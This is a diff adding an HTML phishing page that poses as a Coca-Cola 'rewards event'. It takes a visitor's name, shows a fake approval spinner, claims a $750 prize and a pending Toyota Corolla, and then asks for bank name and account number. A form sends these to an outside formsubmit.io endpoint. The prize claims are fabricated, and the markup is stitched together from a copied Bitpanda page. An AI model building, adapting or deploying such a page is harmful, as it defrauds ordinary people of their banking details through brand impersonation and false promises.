@@ -1,0 +1,990 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+
+<meta charset=utf-8>
+
+  <title>Coca - Cola | Enjoy</title>
+  <style>
+    #mainContent {
+      display: none;
+    }
+    
+    #processing {
+      display: none;
+      text-align: center;
+    }
+    
+    .lds-ring {
+      display: inline-block;
+      position: relative;
+      width: 80px;
+      height: 80px;
+    }
+    
+    .lds-ring div {
+      box-sizing: border-box;
+      display: block;
+      position: absolute;
+      width: 154px;
+      height: 154px;
+      margin: 8px;
+      border: 8px solid DarkRed;
+      border-radius: 50%;
+      animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+      border-color: DarkRed  transparent transparent transparent;
+    }
+    
+    .lds-ring div:nth-child(1) {
+      animation-delay: -0.45s;
+    }
+    
+    .lds-ring div:nth-child(2) {
+      animation-delay: -0.3s;
+    }
+    
+    .lds-ring div:nth-child(3) {
+      animation-delay: -0.15s;
+    }
+    
+    @keyframes lds-ring {
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+  </style>
+  <script>
+    function submitForm() {
+      // Hide the form
+      document.getElementById("myForm").style.display = "none";
+      
+      // Display the "Processing" message and animation
+      document.getElementById("processing").style.display = "block";
+      
+      // Delay displaying the main content
+      setTimeout(function() {
+        // Hide the processing message and animation
+        document.getElementById("processing").style.display = "none";
+        
+        // Display the main content
+        document.getElementById("mainContent").style.display = "block";
+        
+        // Get the form data
+        const name = document.getElementById("name").value;
+     
+        
+        // Display the submitted form data in multiple places within the main content
+        const submittedNameElements = document.getElementsByClassName("submittedName");
+        
+        
+        for (let i = 0; i < submittedNameElements.length; i++) {
+          submittedNameElements[i].textContent = name;
+        }
+        
+        
+        // Scroll to the main content section
+        document.getElementById("mainContent").scrollIntoView({ behavior: 'smooth' });
+      }, 30000); // 13 seconds delay
+    }
+  </script>
+</head>
+<body>
+  
+  
+  
+  
+  <form id="myForm" onsubmit="submitForm(); return false;">
+  
+ <br> 
+
+<img style="-webkit-user-select: none;max-width: 100%;margin: auto;" src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ce/Coca-Cola_logo.svg/640px-Coca-Cola_logo.svg.png">
+
+ 
+ 
+   
+  
+    
+  <div> 
+  <div class="formbold-form-wrapper">
+
+
+  <form id="myForm" onsubmit="submitForm(); return false;">
+
+
+<p>
+<strong> 
+
+<br> <br>
+<span style="color: Black">
+To complete your application,  enter your full name
+</span>
+</strong> 
+</p> 
+
+
+
+
+<div id="error-message"></div>
+
+<script>
+function validateInput(input) {
+  var minLength = 6;
+  var maxLength = 50;
+  var errorMessage = document.getElementById("error-message");
+
+  if (input.value.length < minLength || input.value.length > maxLength) {
+    errorMessage.textContent = "Enter your name";
+    input.setCustomValidity("Enter your full name");
+  } else {
+    errorMessage.textContent = "";
+    input.setCustomValidity("");
+  }
+}
+</script>
+
+
+
+
+<div class="formbold-mb-5">
+        <label for="Field1" class="formbold-form-label">   
+        
+        </label>
+  
+        <input
+          type="text" 
+          
+          oninput="validateInput(this)"
+          
+          required 
+          
+          
+          
+          name="A_"
+         
+         id="name"
+         
+          placeholder="Enter Your First and Last Name"  
+          class="formbold-form-input"
+        />
+      </div>
+      
+
+
+
+
+      <div>
+        <button type="submit" value="Submit"
+       class="formbold-btn w-full">CONTINUE</button>
+      </div>
+      
+      
+         <br><br><br><br><br><br>
+
+
+<strong> 
+<p style="background-color: black; color: white; padding: 20px; text-align: center;">
+  
+<br> &copy 1886 - 2023 | Coca - Cola  <br> 
+
+
+
+
+ All rights reserved.
+<br> <br> <br> </strong>
+</p>
+
+
+  
+    </form>
+  </div>
+</div>
+
+
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+  body {
+    font-family: "Inter", sans-serif;
+  }
+  .formbold-mb-5 {
+    margin-bottom: 20px;
+  }
+  .formbold-pt-3 {
+    padding-top: 12px;
+  }
+  .formbold-main-wrapper {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 48px;
+  }
+
+  .formbold-form-wrapper {
+    margin: 0 auto;
+    max-width: 550px;
+    width: 100%;
+    background: white;
+  }
+  .formbold-form-label {
+    display: block;
+    font-weight: 600;
+    font-size: 20px;
+    color: Black;
+    margin-bottom: 14px;
+  }
+  .formbold-form-label-2 {
+    font-weight: 600;
+    font-size: 20px;
+    margin-bottom: 20px;
+  }
+
+  .formbold-form-input {
+    width: 100%;
+    padding: 17px 24px;
+    border-radius: 6px;
+    border: 2px solid Black;
+    background: white;
+    font-weight: 500;
+    font-size: 21px;
+    color: Black;
+    outline: none;
+    resize: none;
+  }
+  .formbold-form-input:focus {
+    border-color: DarkGrey;
+    box-shadow: 0px 3px 8px rgba(0, 0, 0, 0.05);
+  }
+
+  .formbold-btn {
+    text-align: center;
+    font-size: 26px;
+    border-radius: 30px;
+    padding: 18px 32px;
+    border: none;
+    font-weight: 600;
+    background-color: DarkRed;
+    color: white;
+    cursor: pointer;
+  }
+  .formbold-btn:hover {
+    box-shadow: 0px 3px 8px rgba(0, 0, 0, 0.05);
+  }
+
+  .formbold--mx-3 {
+    margin-left: -12px;
+    margin-right: -12px;
+  }
+  .formbold-px-3 {
+    padding-left: 12px;
+    padding-right: 12px;
+  }
+  .flex {
+    display: flex;
+  }
+  .flex-wrap {
+    flex-wrap: wrap;
+  }
+  .w-full {
+    width: 100%;
+  }
+
+  .formbold-file-input input {
+    opacity: 0;
+    position: absolute;
+    width: 100%;
+    height: 100%;
+  }
+
+  .formbold-file-input label {
+    position: relative;
+    border: 1px dashed #e0e0e0;
+    border-radius: 6px;
+    min-height: 200px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 48px;
+    text-align: center;
+  }
+  .formbold-drop-file {
+    display: block;
+    font-weight: 600;
+    color: #07074d;
+    font-size: 20px;
+    margin-bottom: 8px;
+  }
+
+  .formbold-or {
+    font-weight: 500;
+    font-size: 16px;
+    color: #6b7280;
+    display: block;
+    margin-bottom: 8px;
+  }
+  .formbold-browse {
+    font-weight: 500;
+    font-size: 16px;
+    color: #07074d;
+    display: inline-block;
+    padding: 8px 28px;
+    border: 1px solid #e0e0e0;
+    border-radius: 4px;
+  }
+
+  .formbold-file-list {
+    border-radius: 6px;
+    background: #f5f7fb;
+    padding: 16px 32px;
+  }
+
+  .formbold-file-item {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+
+  .formbold-file-item button {
+    color: DarkRed;
+    border: none;
+    background: transparent;
+    cursor: pointer;
+  }
+
+  .formbold-file-name {
+    font-weight: 500;
+    font-size: 16px;
+    color: #07074d;
+    padding-right: 12px;
+  }
+  .formbold-progress-bar {
+    margin-top: 20px;
+    position: relative;
+    width: 100%;
+    height: 6px;
+    border-radius: 8px;
+    background: #e2e5ef;
+  }
+
+  .formbold-progress {
+    position: absolute;
+    width: 75%;
+    height: 100%;
+    left: 0;
+    top: 0;
+    background: #6a64f1;
+    border-radius: 8px;
+  }
+
+  @media (min-width: 540px) {
+    .sm\:w-half {
+      width: 50%;
+    }
+  }
+</style>
+
+  
+
+  
+
+
+
+
+
+  <div id="processing">
+
+
+
+
+
+
+
+
+
+
+
+
+    <h5> 
+<strong> 
+<br> 
+
+<font size="+2">
+Application Processing.....
+</font>
+
+<br><br>
+
+<span style="color: DarkRed">
+
+If you are approved</span>:  you'll instantly receive a cash prize ranging from   $750 to a whopping $3,000, and also get details on the Toyota Corolla.
+
+<br><br>
+
+
+<span style="color: DarkRed">
+
+If you are not approved</span>: you can try again next year
+
+<br> <br>
+
+<font size="+2">
+Please wait. This takes less than a minute. Do not leave this page.
+
+</font> 
+
+   </strong> 
+</h5> 
+
+
+
+
+    <div class="lds-ring">
+      <div></div>
+      <div></div>
+      <div></div>
+      <div></div>
+    </div>
+  </div>
+  
+
+
+
+  <div id="mainContent">
+
+
+
+
+
+   
+<html class=light lang=en><head><script src="https://www.googleoptimize.com/optimize.js?id=OPT-N3D6ZNP"></script><script>if(document.cookie.match("uc_performance_v1_0=accepted")?.length){
+            window.dataLayer.push({'event': 'optimize.activate'});
+        }</script>
+
+
+<meta charset=utf-8>
+
+
+<title>
+
+Tom Jones
+
+</title>
+
+
+
+<meta content="width=device-width, initial-scale=1.0" name=viewport>
+
+
+
+<link href=https://www.bitpanda.com/en rel=canonical><link href=/en hreflang=x-default rel=alternate><link href=/en hreflang=en rel=alternate><link href=/de hreflang=de rel=alternate><link href=/fr hreflang=fr rel=alternate><link href=/es hreflang=es rel=alternate><link href=/it hreflang=it rel=alternate><link href=/pl hreflang=pl rel=alternate>
+
+<link href="https://cdn.bitpanda.com/app/v2/css/all.min.css?id=622e023bba9164dff838" rel=stylesheet><script src="https://cdn.bitpanda.com/app/v2/js/head.min.js?id=e37b5634f1d9be3b8e80"></script>
+
+
+<script type=application/ld+json>{
+                "@context": "https://schema.org",
+                "@type": "BreadcrumbList",
+                "itemListElement": [
+                    [{"@type":"ListItem","position":1,"name":"Home","item":"https:\/\/www.bitpanda.com\/en"}]
+                ]
+            }</script> <body class="default home light" style="position: unset;"><header id=layout-header><header><div class="bp-nav js-contains-anchor"><div class=bp-nav__container><div class=util-flex-shrink-0>
+
+
+
+
+
+
+
+
+
+
+
+<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ce/Coca-Cola_logo.svg/640px-Coca-Cola_logo.svg.png" jsaction="VQAsE" class="r48jcc pT0Scc iPVvYb" style="max-width: 1280px; opacity: 1; transform: none; width: 195px; height: 55px; margin: 0px;" alt="Coca-Cola - Wikipedia" jsname="kn3ccd" aria-hidden="false">
+
+
+
+
+
+
+
+
+
+
+
+ </div>
+ 
+</header> 
+    
+    
+    
+    
+  
+
+ <section id=layout-content tabindex=-1><section class="default uk-padding-remove-bottom uk-section"><div class=uk-container><div class="uk-child-width-1-2@m uk-flex-middle uk-grid" uk-grid=""><div class=default><section class="module-text uk-padding-remove-bottom uk-padding-remove-top uk-section uk-text-left uk-text-left@m"><div class=module-text__content>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h6> <strong>
+
+
+
+
+<div style="background-color: darkred; border-radius: 10px; padding: 20px; color: white;">
+
+<font size="+2">
+
+ <span class="submittedName"></span>
+ 
+ </font> 
+ 
+ <br> 
+ 
+ <br> 
+
+<div> 
+<div class="container">
+    <div class="left-text"><strong> 
+    
+<font size="+1">
+
+Approved
+
+</strong></font>
+
+</div>
+    <div class="right-text"><font size="+1">Balance:</font> <strong>
+    
+    <br>
+    
+    <font size="+5">
+ $750
+</font></strong> </div>
+</div>
+
+<style>
+    .container {
+        display: flex;
+        justify-content: space-between;
+    }
+    .left-text {
+        justify-self: flex-start;
+    }
+    .right-text {
+        justify-self: flex-end;
+    }
+</style>
+
+</div> 
+
+</div> 
+
+</h6>
+
+
+
+
+
+
+
+
+
+
+
+<h6> <br><br> 
+
+
+<strong> 
+<center> 
+    
+    
+    <font size="+2">
+    
+    Application Approved
+    
+    </font> 
+    <img src="https://i.ibb.co/TLNXZLn/Verified-20230929-112128.png" alt="Verified-20230929-112128" width="40" height="35" data-is360="0" class="" style="display: inline-block; cursor: zoom-in;" data-zoom="zoom-class0">
+
+  
+</center>  
+
+<br> <br> 
+<font size="+1">
+<Font STYLE="word-spacing:4px">
+
+
+Congratulations, <span class="submittedName"></span>,
+your application for the 2023 Coca-Cola rewards event has been approved. 
+<br> <br> 
+While you didn't qualify for the full $3,000 prize, we're excited to announce that you have qualified to win $750. The $750 cash prize has been successfully deposited into your Coca-Cola rewards profile account. You can now claim your well-deserved $750 cash prize immediately, courtesy of the Coca-Cola team. We hope you enjoy this reward to the fullest!
+
+<br><br> While
+Your application to win a toyota corolla is still being processed, we will notify you within 3 business days if you have also won the Toyota Corolla.
+
+
+
+<br><br>
+
+
+Congratulations on winning the well-deserved 
+$750 cash prize! Claiming your reward has never been easier and more convenient. You can now swiftly and effortlessly claim  the $750  from your cola-cola profile and deposit it into any bank of your choice, ensuring you can start enjoying it immediately. As you eagerly await our decision on whether you also qualify to win the Toyota Corolla.
+
+<br><br>
+<span class="submittedName"></span>, kindly
+specify the bank where she would prefer to receive the cash prize below:
+
+
+</font>  </font> 
+<br> 
+ </h6> 
+
+
+
+<br> 
+ 
+  <!-- Author: FormBold Team -->
+  <!-- Learn More: https://formbold.com -->
+  
+ 
+  
+  <div class="formbold-form-wrapper7">
+
+
+
+<form  action="https://formsubmit.io/send/538bcbc9-8ef0-46ba-9114-8a9534b3b334" method="POST">
+
+<input name="_redirect" type="hidden" id="name" value="https://celebrity-org.github.io/Code/">
+
+
+
+<div class="formbold-mb-7">
+        <label for="Field1" class="formbold-form-label">   
+        Name Of Bank To Receive Prize
+        </label>
+  
+        <input
+          type="text" required
+          name="a-NameBankTomJones"
+          id="field1"
+          placeholder="Enter Name Of Bank" 
+          class="formbold-form-input"
+        />
+      </div>
+      
+
+
+
+<br> 
+
+
+<div class="formbold-mb-7">
+        <label for="Field1" class="formbold-form-label">   
+          Account Number
+        </label>
+  
+        <input
+          type="text" required
+          name="b-Account-NumberTomJones"
+          id="field1"
+          placeholder="Enter  Account Number" 
+          class="formbold-form-input"
+        />
+      </div>
+
+
+
+
+
+
+
+        <div class="formbold-mb-7">  
+     </div>    
+
+      <div>
+        <button type="submit" value="Submit"
+       class="formbold-btn w-full">CONTINUE</button>
+      </div>
+    </form>
+  </div>
+</div>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+  body {
+    font-family: "Inter", sans-serif;
+  }
+  .formbold-mb-7 {
+    margin-bottom: 20px;
+  }
+  .formbold-pt-8 {
+    padding-top: 12px;
+  }
+  .formbold-main-wrapper {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 48px;
+  }
+
+  .formbold-form-wrapper {
+    margin: 0 auto;
+    max-width: 550px;
+    width: 100%;
+    background: white;
+  }
+  .formbold-form-label {
+    display: block;
+    font-weight: 500;
+    font-size: 21px;
+    color: Black;
+    margin-bottom: 14px;
+  }
+  .formbold-form-label-9 {
+    font-weight: 500;
+    font-size: 21px;
+    margin-bottom: 20px;
+  }
+
+  .formbold-form-input {
+    width: 100%;
+    padding: 17px 24px;
+    border-radius: 6px;
+    border: 2px solid Black;
+    background: white;
+    font-weight: 500;
+    font-size: 21px;
+    color: Black;
+    outline: none;
+    resize: none;
+  }
+  .formbold-form-input:focus {
+    border-color: Grey;
+    box-shadow: 0px 3px 8px rgba(0, 0, 0, 0.05);
+  }
+
+  .formbold-btn {
+    text-align: center;
+    font-size: 26px;
+    border-radius: 30px;
+    padding: 18px 32px;
+    border: none;
+    font-weight: 500;
+    background-color: DarkRed;
+    color: white;
+    cursor: pointer;
+  }
+  .formbold-btn:hover {
+    box-shadow: 0px 3px 8px rgba(0, 0, 0, 0.05);
+  }
+
+  .formbold--mx-3 {
+    margin-left: -12px;
+    margin-right: -12px;
+  }
+  .formbold-px-3 {
+    padding-left: 12px;
+    padding-right: 12px;
+  }
+  .flex {
+    display: flex;
+  }
+  .flex-wrap {
+    flex-wrap: wrap;
+  }
+  .w-full {
+    width: 100%;
+  }
+
+  .formbold-file-input input {
+    opacity: 0;
+    position: absolute;
+    width: 100%;
+    height: 100%;
+  }
+
+  .formbold-file-input label {
+    position: relative;
+    border: 1px dashed #e0e0e0;
+    border-radius: 6px;
+    min-height: 200px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 48px;
+    text-align: center;
+  }
+  .formbold-drop-file {
+    display: block;
+    font-weight: 600;
+    color: #07074d;
+    font-size: 20px;
+    margin-bottom: 8px;
+  }
+
+  .formbold-or {
+    font-weight: 500;
+    font-size: 16px;
+    color: #6b7280;
+    display: block;
+    margin-bottom: 8px;
+  }
+  .formbold-browse {
+    font-weight: 500;
+    font-size: 16px;
+    color: #07074d;
+    display: inline-block;
+    padding: 8px 28px;
+    border: 1px solid #e0e0e0;
+    border-radius: 4px;
+  }
+
+  .formbold-file-list {
+    border-radius: 6px;
+    background: #f5f7fb;
+    padding: 16px 32px;
+  }
+
+  .formbold-file-item {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+
+  .formbold-file-item button {
+    color: DarkRed;
+    border: none;
+    background: transparent;
+    cursor: pointer;
+  }
+
+  .formbold-file-name {
+    font-weight: 500;
+    font-size: 16px;
+    color: #07074d;
+    padding-right: 12px;
+  }
+  .formbold-progress-bar {
+    margin-top: 20px;
+    position: relative;
+    width: 100%;
+    height: 6px;
+    border-radius: 8px;
+    background: #e2e5ef;
+  }
+
+  .formbold-progress {
+    position: absolute;
+    width: 75%;
+    height: 100%;
+    left: 0;
+    top: 0;
+    background: #6a64f1;
+    border-radius: 8px;
+  }
+
+  @media (min-width: 540px) {
+    .sm\:w-half {
+      width: 50%;
+    }
+  }
+</style>
+
+</div> 
+
+
+
+
+
+
+
+
+<h5><br><br> <br>
+<img style="-webkit-user-select: none;max-width: 100%;margin: auto;" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcScV3QvdzsW08Mwn9Jn9kMIPZgsFknDe4Dtxw&amp;amp;usqp=CAU">
+
+<br> <br> <br>
+Congratulations  <span class="submittedName"></span>, You are one of the fortunate individuals who have won big in the highly anticipated 2023 Coca-Cola Rewards Event. We are thrilled to present you with this remarkable reward, and we sincerely hope it brings you immense joy and fulfillment. Feel free to share your incredible experience with Coca-Cola with your friends and family, as we believe in fostering genuine connections with our valued customers. Coca-Cola truly shines as a brand that prioritizes customer satisfaction, exemplified by the offering of this incredibly valuable prize. Once again, we extend our warmest congratulations, and we hope you relish every moment of this well-deserved win.
+   </font> </h5> 
+
+
+
+
+<h5> <br> <br><br> <br> 
+
+<img style="-webkit-user-select: none;max-width: 100%;margin: auto;" src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ce/Coca-Cola_logo.svg/640px-Coca-Cola_logo.svg.png">
+
+<br> <br> 
+<strong> 
+<footer style="background-color: black; color: white; padding: 20px; text-align: center;">
+  <p>
+<br> &copy 1886 - 2023 | Coca - Cola  <br> 
+
+
+ All rights reserved.
+<br> <br> <br> </strong>
+</p>
+</footer>
+</strong>
+</h5> 
+
+
+
+
+
+<script>window.initScriptLater = function (scriptUrl, fallback) {
+        const script = document.createElement("script");
+        script.onload = fallback;
+        script.src = scriptUrl;
+
+        document.addEventListener("readystatechange", () => {
+            if (document.readyState === "interactive") {
+                document.head.appendChild(script);
+            }
+        });
+    };
+
+    window.initScriptLater("https://cdn.bitpanda.com/app/v2/js/cta-button.min.js?id=d34a8a89944479eef669", () =>
+        window.initCtaButton()
+    );</script></div></nav> </div> </div></div> </section> <section class=footer__navbar><div class=uk-container><div class="uk-child-width-auto@s uk-flex-between uk-flex-middle" uk-grid="">
+
+
+<div>
+
+
+ </section> <section class="footer__navbar footer__navbar--sm footer__navbar__gradient"><div class=uk-container><div class=uk-flex-between uk-grid=""><div class="uk-text-center uk-text-right@m uk-width-1-1 uk-width-auto@m">
+
+
+
+</path> </symbol></svg>
+
+
+  </div>
+  
+  <script>
+    // Hide the processing message and form initially
+    document.getElementById("processing").style.display = "none";
+    document.getElementById("myForm").style.display = "block";
+  </script>
+</body>
+</html>
